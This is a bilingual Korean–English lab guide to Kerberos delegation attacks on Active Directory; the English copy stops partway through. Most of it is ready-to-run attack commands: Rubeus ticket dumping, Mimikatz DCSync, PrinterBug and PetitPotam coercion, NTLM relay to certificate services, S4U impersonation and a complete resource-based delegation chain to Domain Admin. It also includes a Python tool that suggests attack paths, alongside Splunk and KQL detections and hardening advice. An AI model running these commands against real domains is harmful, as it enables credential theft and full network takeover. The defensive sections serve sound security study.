> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# Kerberos 위임 공격 완전 가이드
> AI_Innovation_Studio | Active Directory Delegation Attacks Lab

---

## 1. Kerberos 위임 개요

### Kerberos 인증 흐름 복습

```
클라이언트                  KDC (Key Distribution Center)       서비스
    │                              │                              │
    │─── AS-REQ (사용자명+암호) ───→│                              │
    │←── AS-REP (TGT 발급) ────────│                              │
    │                              │                              │
    │─── TGS-REQ (TGT + SPN) ────→│                              │
    │←── TGS-REP (Service Ticket) ─│                              │
    │                                                             │
    │─────────────── AP-REQ (Service Ticket) ───────────────────→│
    │←──────────────── AP-REP (인증 완료) ───────────────────────│
```

### 위임(Delegation)이란

웹 서버(서비스 A)가 사용자를 대신해 데이터베이스(서비스 B)에 접근해야 할 때 필요한 메커니즘이다. 사용자의 Kerberos 자격 증명을 서비스가 재사용해 다른 서비스에 인증한다.

### 위임 유형 비교

| 유형 | AD 속성 | 제약 | 공격 위험도 |
|------|---------|------|-----------|
| **비제약 위임** (Unconstrained) | `TrustedForDelegation=True` | 없음 (모든 서비스 가능) | ★★★★★ 매우 높음 |
| **제약 위임** (Constrained) | `TrustedToAuthForDelegation=True` | 특정 SPN만 허용 | ★★★★☆ 높음 |
| **리소스 기반 제약 위임** (RBCD) | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 리소스가 허용 목록 지정 | ★★★★☆ 높음 |

---

## 2. 위임 설정 열거

### PowerView로 열거

```powershell
# Import-Module PowerView.ps1 먼저 실행

# 비제약 위임 컴퓨터 목록
Get-ADComputer -Filter {TrustedForDelegation -eq $true} `
    -Properties TrustedForDelegation, ServicePrincipalName, Description |
    Select-Object Name, DNSHostName, ServicePrincipalName

# 제약 위임 설정된 서비스 계정
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties SAMAccountName, msDS-AllowedToDelegateTo, userAccountControl |
    Select-Object SAMAccountName, msDS-AllowedToDelegateTo

# PowerView 사용
Get-DomainComputer -Unconstrained | Select-Object Name, DnsHostName
Get-DomainUser -TrustedToAuth | Select-Object SAMAccountName, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | Select-Object Name, msDS-AllowedToDelegateTo
```

AD 환경에서 위임이 설정된 컴퓨터와 서비스 계정을 열거한다. TrustedForDelegation=True인 컴퓨터가 비제약 위임 공격의 주요 대상이 된다.

### ldapsearch로 열거 (Linux)

```bash
# 비제약 위임 컴퓨터 (userAccountControl 플래그 0x80000 = TRUSTED_FOR_DELEGATION)
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
    sAMAccountName userAccountControl

# 제약 위임 계정
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(msDS-AllowedToDelegateTo=*)" \
    sAMAccountName "msDS-AllowedToDelegateTo"
```

### BloodHound Cypher 쿼리

```cypher
// 비제약 위임 컴퓨터 (DC 제외)
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name, c.operatingsystem

// 제약 위임 설정된 계정
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name

// RBCD 경로: 쓰기 권한 → RBCD 설정 가능
MATCH p=shortestPath((u:User)-[*1..5]->(c:Computer))
WHERE ANY(r IN relationships(p) WHERE type(r) IN ["GenericAll","GenericWrite","WriteProperty"])
AND NOT u.name = "Administrator"
RETURN p
```

---

## 3. 비제약 위임 (Unconstrained Delegation) 공격

### 원리

```
공격자                     비제약 위임 서버           KDC              DC
    │                           │                   │               │
    │                           │←── 사용자 연결 ───│               │
    │                           │    TGT가 메모리에 저장됨           │
    │                           │                   │               │
    │── 서버 침해 ──────────────→│                   │               │
    │←── Rubeus dump ──────────│   TGT 추출 가능    │               │
    │                           │                   │               │
    │── TGT로 DCSync ───────────────────────────────────────────────→│
    │←── 모든 해시 덤프 ─────────────────────────────────────────────│
```

비제약 위임 서버에 연결된 모든 사용자의 TGT가 서버 메모리에 저장된다. 서버를 침해하면 해당 TGT를 추출해 사용자를 완전히 위장할 수 있다.

### 공격 실행: Rubeus로 TGT 추출

```powershell
# (비제약 위임 서버 장악 후) 현재 메모리의 모든 TGT 덤프
Rubeus.exe dump /nowrap

# 실시간 모니터링 (5초마다 새 TGT 수집)
Rubeus.exe monitor /interval:5 /nowrap /filteruser:Administrator

# 추출한 Base64 TGT를 파일로 저장 후 사용
Rubeus.exe ptt /ticket:<base64_TGT>

# TGT로 DCSync 수행 (Mimikatz)
mimikatz# lsadump::dcsync /user:krbtgt /domain:corp.local
```

Rubeus monitor는 새로운 TGT가 메모리에 올라올 때마다 자동으로 캡처한다. DC01의 TGT가 캡처되면 도메인 전체를 장악할 수 있다.

### SpoolSample / PrinterBug로 강제 인증 유도

DC01을 비제약 위임 서버로 강제로 인증하게 만들어 DC01의 TGT를 캡처한다.

```bash
# Linux (printerbug.py — impacket 기반)
python3 printerbug.py corp.local/lowpriv:Password123@DC01.corp.local \
    UNCONSTRAINED_SERVER.corp.local

# Windows (SpoolSample.exe)
SpoolSample.exe DC01.corp.local UNCONSTRAINED_SERVER.corp.local

# 동시에 비제약 위임 서버에서 Rubeus monitor 실행
Rubeus.exe monitor /interval:3 /filteruser:DC01$ /nowrap
```

PrinterBug은 Windows 스풀러 서비스의 RPC 기능을 악용해 DC01이 공격자 서버에 NTLM 인증하도록 강제한다.

### PetitPotam으로 강제 인증 (EFSRPC)

```bash
# PrinterBug이 패치된 환경에서 대안
python3 PetitPotam.py -u lowpriv -p Password123 \
    UNCONSTRAINED_SERVER.corp.local DC01.corp.local

# NTLM Relay와 결합해 DC 인증서 탈취 가능 (AD CS 환경)
python3 ntlmrelayx.py -t http://CA.corp.local/certsrv/certfnsh.asp \
    --adcs --template DomainController
```

### 탐지

```
이벤트 ID 4769: Kerberos Service Ticket Request
  → 비정상: DC 머신 계정(DC01$)의 TGS 요청이 내부 서버에서 발생
  → Ticket Options에 forwardable(0x40000000) 플래그 확인

이벤트 ID 4624 Type 3: 네트워크 로그온
  → 비제약 위임 서버로의 반복적 DC 인증
```

---

## 4. 제약 위임 (Constrained Delegation) 공격

### 원리: S4U Extension

```
S4U2Self: 서비스가 임의 사용자를 대신해 자신에게 서비스 티켓 요청
S4U2Proxy: S4U2Self로 얻은 티켓으로 허용된 서비스에 위임된 요청 수행

공격 요소:
  - TrustedToAuthForDelegation=True 계정의 해시 또는 TGT
  - msDS-AllowedToDelegateTo에 허용된 SPN 목록

공격 결과:
  - 허용된 서비스에 임의 사용자(Administrator 포함)로 인증 가능
```

### 열거 및 타겟 식별

```powershell
# 제약 위임 서비스 계정 상세 정보
Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties msDS-AllowedToDelegateTo, userAccountControl |
    ForEach-Object {
        Write-Host "계정: $($_.SamAccountName)"
        Write-Host "허용 SPN: $($_.msDS-AllowedToDelegateTo)"
        Write-Host "Protocol Transition: $(($_.userAccountControl -band 0x1000000) -ne 0)"
        Write-Host "---"
    }
```

### 공격 실행: Rubeus S4U

```powershell
# 방법 1: 서비스 계정 패스워드 해시로 (Kerberoasting 등으로 획득)
Rubeus.exe s4u /user:svc_iis `
    /rc4:NTLM_HASH_HERE `
    /impersonateuser:Administrator `
    /msdsspn:"cifs/fileserver.corp.local" `
    /nowrap

# 방법 2: S4U + alterservice (다른 SPN으로 티켓 변환)
# 허용된 SPN: http/webserver → cifs/webserver로 변환
Rubeus.exe s4u /user:svc_iis `
    /rc4:NTLM_HASH `
    /impersonateuser:Administrator `
    /msdsspn:"http/webserver.corp.local" `
    /altservice:"cifs/webserver.corp.local,host/webserver.corp.local" `
    /nowrap

# 획득한 TGS를 메모리에 주입
Rubeus.exe ptt /ticket:<base64_TGS>

# 접근 확인
dir \\fileserver.corp.local\C$
```

Rubeus s4u는 서비스 계정의 해시만으로 Administrator 권한의 서비스 티켓을 발급받는다. alterservice 옵션으로 허용된 SPN을 다른 서비스로 변환할 수 있다.

### impacket으로 동일 공격 (Linux)

```bash
# getST.py로 서비스 티켓 획득
getST.py -spn 'cifs/fileserver.corp.local' \
    -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 \
    'corp.local/svc_iis:ServicePassword'

# 획득한 ccache 파일 사용
export KRB5CCNAME=Administrator.ccache
smbclient.py -k -no-pass fileserver.corp.local

# DCSync (Domain Admin TGS가 있다면)
secretsdump.py -k -no-pass corp.local
```

---

## 5. 리소스 기반 제약 위임 (RBCD) 공격

### 원리

```
기존 제약 위임: 위임 권한을 서비스 제공자(KDC)가 서비스에 부여
RBCD:           위임 권한을 리소스(타겟)가 스스로 허용 목록 지정

필요 조건:
  - 타겟 컴퓨터 객체에 대한 GenericAll/GenericWrite/WriteProperty 권한
  - 또는 Domain Users가 기본적으로 가지는 ms-DS-MachineAccountQuota (기본값: 10)
    → 도메인에 새 컴퓨터 계정 최대 10개까지 직접 생성 가능

공격 흐름:
  1. 가짜 컴퓨터 계정(FAKEMACHINE$) 생성
  2. 타겟 컴퓨터의 msDS-AllowedToActOnBehalfOfOtherIdentity에 FAKEMACHINE$ 추가
  3. S4U2Self+S4U2Proxy로 Administrator TGS 획득
  4. 타겟 컴퓨터에 Administrator로 접근
```

### 완전한 공격 체인 (Linux — impacket)

```bash
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 단계 1: MachineAccountQuota 확인
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(objectClass=domain)" \
    ms-DS-MachineAccountQuota

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 단계 2: 가짜 컴퓨터 계정 생성
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
addcomputer.py \
    -computer-name 'FAKEMACHINE$' \
    -computer-pass 'FakePass123!' \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 단계 3: 타겟 컴퓨터에 RBCD 속성 설정
# (lowpriv 계정이 TARGET$ 객체에 쓰기 권한 있어야 함)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
rbcd.py \
    -delegate-from 'FAKEMACHINE$' \
    -delegate-to 'TARGET$' \
    -action write \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# 설정 확인
rbcd.py \
    -delegate-to 'TARGET$' \
    -action read \
    -dc-ip 192.168.1.10 \
    'corp.local/lowpriv:Password123'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 단계 4: S4U2Self + S4U2Proxy로 Administrator TGS 획득
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
getST.py \
    -spn 'cifs/TARGET.corp.local' \
    -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 \
    'corp.local/FAKEMACHINE$:FakePass123!'

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# 단계 5: 획득한 TGS로 타겟 접근
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
export KRB5CCNAME=Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache

# SMB로 접근
smbclient.py -k -no-pass TARGET.corp.local

# 해시 덤프 (local admin 권한)
secretsdump.py -k -no-pass TARGET.corp.local

# 원격 명령 실행
psexec.py -k -no-pass Administrator@TARGET.corp.local
```

가짜 컴퓨터 계정을 생성하고 RBCD 속성을 설정한 뒤 S4U2Proxy로 Administrator 서비스 티켓을 발급받는 전체 공격 체인이다.

### RBCD 공격 (Windows — Rubeus + PowerView)

```powershell
# 단계 1: 가짜 컴퓨터 계정 생성
New-MachineAccount -MachineAccount FAKEMACHINE -Password $(ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# 단계 2: 가짜 컴퓨터의 SID 획득
$SID = Get-DomainComputer FAKEMACHINE -Properties objectsid | Select -Expand objectsid

# 단계 3: RBCD 속성 설정 (PowerView의 Set-DomainObject)
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($SID))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# 단계 4: S4U로 TGS 획득 및 주입
Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:<NTLM_hash_of_FakePass123!> `
    /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt

# 접근 확인
dir \\TARGET.corp.local\C$
```

### GenericWrite → RBCD 경로 (흔한 시나리오)

```
BloodHound에서 발견 가능한 경로:
  lowpriv (User) → [GenericWrite] → WORKSTATION01 (Computer)
  
  WORKSTATION01에 GenericWrite 권한이 있으므로
  msDS-AllowedToActOnBehalfOfOtherIdentity 속성을 수정할 수 있음
  → RBCD 공격으로 WORKSTATION01의 로컬 관리자 획득
  → 크리덴셜 수집 → 더 높은 권한으로 이동
```

---

## 6. Kerberos 위임 자동화 Python 도구

```python
#!/usr/bin/env python3
"""
Kerberos 위임 취약점 자동 열거 및 공격 경로 분석 도구
ldap3 라이브러리를 사용해 AD에서 위임 설정을 열거하고
공격 가능한 경로를 자동으로 제안합니다.
"""

from __future__ import annotations
import argparse
import json
import sys
from dataclasses import dataclass, field, asdict
from typing import Any

try:
    import ldap3
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
except ImportError:
    print("[!] ldap3 미설치: pip install ldap3", file=sys.stderr)
    sys.exit(1)


UAC_TRUSTED_FOR_DELEGATION = 0x80000         # 비제약 위임
UAC_TRUSTED_TO_AUTH_FOR_DELEGATION = 0x1000000  # 제약 위임 (Protocol Transition)


@dataclass
class DelegationFinding:
    account_name: str
    account_type: str  # "computer" or "user"
    delegation_type: str  # "unconstrained", "constrained", "rbcd"
    allowed_spns: list[str] = field(default_factory=list)
    risk: str = "high"
    attack_path: str = ""


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Kerberos 위임 취약점 자동 열거 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10
  %(prog)s enum -d corp.local -u lowpriv -p Password123 --dc-ip 192.168.1.10 -o findings.json
        """,
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    enum_parser = subparsers.add_parser("enum", help="위임 설정 열거")
    enum_parser.add_argument("-d", "--domain", required=True, help="도메인 이름 (예: corp.local)")
    enum_parser.add_argument("-u", "--username", required=True, help="사용자명")
    enum_parser.add_argument("-p", "--password", required=True, help="패스워드")
    enum_parser.add_argument("--dc-ip", required=True, help="DC IP 주소")
    enum_parser.add_argument(
        "-o", "--output", help="결과 JSON 파일 경로"
    )
    enum_parser.add_argument(
        "--no-dc", action="store_true",
        help="도메인 컨트롤러 계정 결과 제외"
    )

    return parser.parse_args()


def connect_ldap(domain: str, username: str, password: str, dc_ip: str) -> Connection:
    """LDAP 서버에 연결합니다."""
    server = Server(dc_ip, get_info=ALL)
    conn = Connection(
        server,
        user=f"{domain}\\{username}",
        password=password,
        authentication=NTLM,
        auto_bind=True,
    )
    return conn


def get_base_dn(domain: str) -> str:
    """도메인명을 DN 형식으로 변환합니다."""
    return ",".join(f"dc={part}" for part in domain.split("."))


def enumerate_unconstrained(conn: Connection, base_dn: str, exclude_dc: bool) -> list[DelegationFinding]:
    """비제약 위임 설정된 계정을 열거합니다."""
    findings = []

    # UAC 플래그 524288 = 0x80000 = TRUSTED_FOR_DELEGATION
    conn.search(
        search_base=base_dn,
        search_filter="(userAccountControl:1.2.840.113556.1.4.803:=524288)",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "objectClass", "userAccountControl", "dNSHostName"],
    )

    for entry in conn.entries:
        name = str(entry.sAMAccountName)
        obj_class = [c.lower() for c in entry.objectClass]
        account_type = "computer" if "computer" in obj_class else "user"

        if exclude_dc and name.endswith("$") and "domaincontroller" in [c.lower() for c in obj_class]:
            continue

        findings.append(DelegationFinding(
            account_name=name,
            account_type=account_type,
            delegation_type="unconstrained",
            risk="critical",
            attack_path=(
                f"1. {name} 서버 침해\n"
                f"2. Rubeus monitor로 TGT 수집\n"
                f"3. SpoolSample/PetitPotam으로 DC TGT 강제 수집\n"
                f"4. DCSync → 도메인 완전 장악"
            ),
        ))

    return findings


def enumerate_constrained(conn: Connection, base_dn: str) -> list[DelegationFinding]:
    """제약 위임 설정된 계정을 열거합니다."""
    findings = []

    conn.search(
        search_base=base_dn,
        search_filter="(msDS-AllowedToDelegateTo=*)",
        search_scope=SUBTREE,
        attributes=["sAMAccountName", "objectClass", "msDS-AllowedToDelegateTo", "userAccountControl"],
    )

    for entry in conn.entries:
        name = str(entry.sAMAccountName)
        obj_class = [c.lower() for c in entry.objectClass]
        account_type = "computer" if "computer" in obj_class else "user"
        allowed_spns = [str(s) for s in entry["msDS-AllowedToDelegateTo"]]

        uac = int(entry.userAccountControl) if entry.userAccountControl else 0
        protocol_transition = bool(uac & UAC_TRUSTED_TO_AUTH_FOR_DELEGATION)

        findings.append(DelegationFinding(
            account_name=name,
            account_type=account_type,
            delegation_type="constrained",
            allowed_spns=allowed_spns,
            risk="high",
            attack_path=(
                f"1. {name} 계정 크리덴셜 획득 (Kerberoasting 등)\n"
                f"2. Rubeus s4u /user:{name} /rc4:<hash> "
                f"/impersonateuser:Administrator /msdsspn:{allowed_spns[0] if allowed_spns else 'SPN'}\n"
                f"3. 획득한 TGS로 서비스 접근\n"
                f"{'[!] Protocol Transition 활성화 — 임의 사용자 위장 가능' if protocol_transition else ''}"
            ),
        ))

    return findings


def print_findings(findings: list[DelegationFinding]) -> None:
    """발견된 위임 취약점을 출력합니다."""
    if not findings:
        print("[+] 위임 취약점 발견 없음")
        return

    print(f"\n{'='*60}")
    print(f"  총 {len(findings)}개 위임 취약점 발견")
    print(f"{'='*60}\n")

    for i, f in enumerate(findings, 1):
        risk_color = "★★★★★" if f.risk == "critical" else "★★★★☆"
        print(f"[{i}] {f.account_name} ({f.account_type})")
        print(f"    위임 유형:  {f.delegation_type.upper()}")
        print(f"    위험도:    {risk_color}")
        if f.allowed_spns:
            print(f"    허용 SPN: {', '.join(f.allowed_spns[:3])}")
        print(f"    공격 경로:")
        for line in f.attack_path.split("\n"):
            if line.strip():
                print(f"      {line}")
        print()


def main() -> None:
    args = parse_args()

    if args.command == "enum":
        print(f"[*] LDAP 연결: {args.dc_ip} ({args.domain})")
        try:
            conn = connect_ldap(args.domain, args.username, args.password, args.dc_ip)
        except Exception as e:
            print(f"[!] 연결 실패: {e}", file=sys.stderr)
            sys.exit(1)

        base_dn = get_base_dn(args.domain)
        print(f"[*] 검색 베이스: {base_dn}\n")

        all_findings: list[DelegationFinding] = []

        print("[*] 비제약 위임 열거 중...")
        all_findings.extend(enumerate_unconstrained(conn, base_dn, args.no_dc))

        print("[*] 제약 위임 열거 중...")
        all_findings.extend(enumerate_constrained(conn, base_dn))

        print_findings(all_findings)

        if args.output:
            import pathlib
            output_data = [asdict(f) for f in all_findings]
            pathlib.Path(args.output).write_text(
                json.dumps(output_data, indent=2, ensure_ascii=False)
            )
            print(f"[*] 결과 저장: {args.output}")


if __name__ == "__main__":
    main()
```

LDAP으로 AD 환경을 쿼리해 비제약/제약 위임 설정을 자동으로 열거하고, 각 취약점에 대한 구체적인 공격 경로를 제안한다.

---

## 7. 탐지 및 방어

### 이벤트 ID 기반 탐지

| 이벤트 ID | 로그 | 설명 | 위임 공격 연관 |
|---------|-----|------|--------------|
| **4769** | Security | Kerberos Service Ticket Request | S4U 요청 탐지 |
| **4771** | Security | Kerberos Pre-authentication failed | 실패한 AS-REQ |
| **4624** Type 3 | Security | Network Logon | 비제약 위임 서버 접근 |
| **5145** | Security | Network Share Access | cifs/SMB 접근 |
| **4738** | Security | User Account Changed | RBCD 속성 수정 |
| **4742** | Security | Computer Account Changed | RBCD 속성 수정 |

### Splunk 탐지 쿼리

```spl
-- S4U2Self 요청 탐지 (Ticket Options에 forwardable 포함)
index=windows EventCode=4769
| eval ticket_opts=mvindex(split(Ticket_Options, "0x"),1)
| where tonumber(ticket_opts, 16) band 0x40000000 > 0
| where NOT Service_Name IN ("krbtgt", "$")
| stats count, values(Account_Name) by Service_Name, Client_Address
| where count > 5

-- 비제약 위임 서버로의 비정상 연결
index=windows EventCode=4624 Logon_Type=3
| lookup unconstrained_delegation_servers ComputerName AS host
| where isnotnull(delegation_type)
| stats count by src_ip, host, Account_Name
| where count > 10

-- RBCD 속성 수정 탐지
index=windows EventCode=4742
| eval msg=coalesce(Message, "")
| where match(msg, "msDS-AllowedToActOnBehalfOfOtherIdentity")
| table _time, host, Subject_Account_Name, Target_Account_Name
```

### Microsoft Sentinel KQL 탐지

```kusto
// S4U Kerberos 위임 요청 이상 탐지
SecurityEvent
| where EventID == 4769
| extend TicketOptions = tostring(EventData["TicketOptions"])
// Forwardable 플래그 = 0x40000000
| where TicketOptions has "0x40000000"
| where ServiceName !endswith "$" and ServiceName != "krbtgt"
| summarize RequestCount = count(), Accounts = make_set(AccountName)
    by ServiceName, ClientAddress, bin(TimeGenerated, 1h)
| where RequestCount > 20
| extend AlertSeverity = "High"

// RBCD 속성 변경 탐지
SecurityEvent
| where EventID in (4738, 4742)
| where EventData has "msDS-AllowedToActOnBehalfOfOtherIdentity"
| project TimeGenerated, SubjectUserName, TargetUserName = AccountName,
          Computer
| extend AlertSeverity = "Critical"
```

### 방어 대책

```
1. 비제약 위임 완전 제거
   → 레거시 서비스 마이그레이션 후 TrustedForDelegation=False 설정

2. Protected Users 그룹 활용 (Windows Server 2012 R2+)
   → 그룹 멤버는 Kerberos 위임에 사용될 수 없음
   → 관리자 및 서비스 계정 추가

3. 계정 감도 설정
   → "Account is sensitive and cannot be delegated" 체크
   → DA, EA 등 권한 있는 계정에 필수 적용

4. Tiered Administration Model (계층적 관리)
   Tier 0: DC, PKI, 인증 서비스 (격리)
   Tier 1: 서버 관리
   Tier 2: 워크스테이션 관리

5. ms-DS-MachineAccountQuota 값 0으로 설정
   → 일반 사용자의 컴퓨터 계정 생성 차단
   → RBCD 공격의 핵심 선결 조건 제거

6. 제약 위임 → RBCD 마이그레이션
   → 제약 위임보다 세밀한 제어 가능
   → 리소스 소유자가 직접 허용 목록 관리
```

---

## 8. 종합 공격 시나리오: 낮은 권한 → 도메인 관리자

```
상황: lowpriv 계정 (일반 도메인 사용자) → DA 획득
소요 시간: ~15분 (환경 준비 완료 기준)

─────────────────────────────────────────────────────────
단계 1: 정찰 [5분]
─────────────────────────────────────────────────────────
1a. BloodHound로 도메인 수집
    bloodhound-python -u lowpriv -p Password123 \
        -d corp.local -dc 192.168.1.10 -c all --zip

1b. BloodHound GUI에서 분석
    → "Shortest Paths to Domain Admins" 확인
    → RBCD 경로 발견: lowpriv → [GenericWrite] → WORKSTATION01

─────────────────────────────────────────────────────────
단계 2: MachineAccountQuota 확인 [1분]
─────────────────────────────────────────────────────────
crackmapexec ldap 192.168.1.10 -u lowpriv -p Password123 \
    --kdcHost 192.168.1.10 -M maq

─────────────────────────────────────────────────────────
단계 3: RBCD 공격 실행 [5분]
─────────────────────────────────────────────────────────
# 가짜 컴퓨터 생성
addcomputer.py -computer-name 'PWNED$' -computer-pass 'Pwned123!' \
    -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'

# RBCD 속성 설정
rbcd.py -delegate-from 'PWNED$' -delegate-to 'WORKSTATION01$' \
    -action write -dc-ip 192.168.1.10 'corp.local/lowpriv:Password123'

# Administrator TGS 발급
getST.py -spn 'cifs/WORKSTATION01.corp.local' -impersonate 'Administrator' \
    -dc-ip 192.168.1.10 'corp.local/PWNED$:Pwned123!'

─────────────────────────────────────────────────────────
단계 4: 크리덴셜 수집 [2분]
─────────────────────────────────────────────────────────
export KRB5CCNAME=Administrator@cifs_WORKSTATION01.corp.local@CORP.LOCAL.ccache
secretsdump.py -k -no-pass WORKSTATION01.corp.local

# 수집된 해시에서 도메인 관리자 재사용 패스워드 있다면 → DA 획득
# 또는 Kerberoastable 서비스 계정이 워크스테이션 로컬 관리자라면 → 피벗

─────────────────────────────────────────────────────────
단계 5: 도메인 장악
─────────────────────────────────────────────────────────
# DA 크리덴셜로 DCSync
secretsdump.py corp.local/Administrator:'DAPassword'@DC01.corp.local
```

---

<a name="english"></a>

# Kerberos Delegation Attacks — Complete Guide
> AI_Innovation_Studio | Active Directory Delegation Attacks Lab

---

## 1. Kerberos Delegation Overview

### Kerberos Authentication Flow Review

```
Client                     KDC (Key Distribution Center)       Service
    │                              │                              │
    │─── AS-REQ (username+password)→│                              │
    │←── AS-REP (TGT issued) ───────│                              │
    │                              │                              │
    │─── TGS-REQ (TGT + SPN) ─────→│                              │
    │←── TGS-REP (Service Ticket) ──│                              │
    │                                                             │
    │──────────────── AP-REQ (Service Ticket) ──────────────────→│
    │←──────────────── AP-REP (Authentication complete) ─────────│
```

### What is Delegation?

Delegation is the mechanism that allows a web server (Service A) to access a database (Service B) on behalf of a user. The service reuses the user's Kerberos credentials to authenticate to another service.

### Delegation Type Comparison

| Type | AD Attribute | Restriction | Attack Risk |
|------|-------------|-------------|-------------|
| **Unconstrained Delegation** | `TrustedForDelegation=True` | None (any service allowed) | ★★★★★ Very High |
| **Constrained Delegation** | `TrustedToAuthForDelegation=True` | Specific SPNs only | ★★★★☆ High |
| **Resource-Based Constrained Delegation (RBCD)** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Resource specifies allowed list | ★★★★☆ High |

---

## 2. Enumerating Delegation Settings

### Enumeration with PowerView

```powershell
# Run Import-Module PowerView.ps1 first

# List computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true} `
    -Properties TrustedForDelegation, ServicePrincipalName, Description |
    Select-Object Name, DNSHostName, ServicePrincipalName

# Service accounts with constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
    -Properties SAMAccountName, msDS-AllowedToDelegateTo, userAccountControl |
    Select-Object SAMAccountName, msDS-AllowedToDelegateTo

# Using PowerView
Get-DomainComputer -Unconstrained | Select-Object Name, DnsHostName
Get-DomainUser -TrustedToAuth | Select-Object SAMAccountName, msDS-AllowedToDelegateTo
Get-DomainComputer -TrustedToAuth | Select-Object Name, msDS-AllowedToDelegateTo
```

This enumerates computers and service accounts with delegation configured in the AD environment. Computers with TrustedForDelegation=True are the primary targets for unconstrained delegation attacks.

### Enumeration with ldapsearch (Linux)

```bash
# Computers with unconstrained delegation (userAccountControl flag 0x80000 = TRUSTED_FOR_DELEGATION)
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(userAccountControl:1.2.840.113556.1.4.803:=524288)" \
    sAMAccountName userAccountControl

# Accounts with constrained delegation
ldapsearch -x -H ldap://192.168.1.10 \
    -D "CORP\lowpriv" -w "Password123" \
    -b "dc=corp,dc=local" \
    "(msDS-AllowedToDelegateTo=*)" \
    sAMAccountName "msDS-AllowedToDelegateTo"
```

### BloodHound Cypher Queries

```cypher
// Computers with unconstrained delegation (excluding DCs)
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name, c.operatingsystem

// Accounts with constrained delegation configured
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
RETURN u.name, c.name

// RBCD path: write permission → can configure RBCD
MATCH p=shortestPath((u:User)-[*1..5]->(c:Computer))
WHERE ANY(r IN relationships(p) WHERE type(r) IN ["GenericAll","GenericWrite","WriteProperty"])
AND NOT u.name = "Administrator"
RETURN p
```

---

## 3. Unconstrained Delegation Attack

### How It Works

```
Attacker                Unconstrained Delegation Server    KDC              DC
    │                           │                           │               │
    │                           │←── User connects ─────────│               │
    │                           │    TGT stored in memory                   │
    │                           │                           │               │
    │── Compromise server ──────→│                           │               │
    │←── Rubeus dump ───────────│   TGT can be extracted    │               │
    │                           │                           │               │
    │── DCSync with TGT ──────────────────────────────────────────────────→│
    │←── All hashes dumped ───────────────────────────────────────────────│
```

The TGT of every user who connects to an unconstrained delegation server is stored in that server's memory. Compromising the server allows extraction of those TGTs and full impersonation of those users.

### Attack Execution: Extracting TGTs with Rubeus

```powershell
# (After compromising the unconstrained delegation server) dump all TGTs in memory
Rubeus.exe dump /nowrap

# Real-time monitoring (capture new TGTs every 5 seconds)
Rubeus.exe monitor /interval:5 /nowrap /filteruser:Administrator

# Save extracted Base64 TGT to file and use it
Rubeus.exe ptt /ticket:<base64_TGT>

# Perform DCSync with the TGT (Mimikatz)
mimikatz# lsadump::dcsync /user:krbtgt /domain:corp.local
```

Rubeus monitor automatically captures every new TGT that is loaded into memory. If DC01's TGT is captured, the entire domain can be compromised.

### Forcing Authentication with SpoolSample / PrinterBug

